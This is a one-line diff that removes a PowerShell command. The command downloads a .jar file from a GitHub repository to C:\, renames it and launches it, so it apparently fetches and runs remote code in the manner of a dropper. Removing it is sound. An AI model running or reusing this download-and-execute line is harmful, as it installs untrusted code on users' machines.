@@ -1,1 +1,0 @@
-Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/raw/main/mo1scrypt.jar" -OutFile "C:\mo1scrypt.jar"; Rename-Item -Path "C:\mo1scrypt.jar" -NewName "1.jar"; Start-Process -FilePath "C:\1.jar";
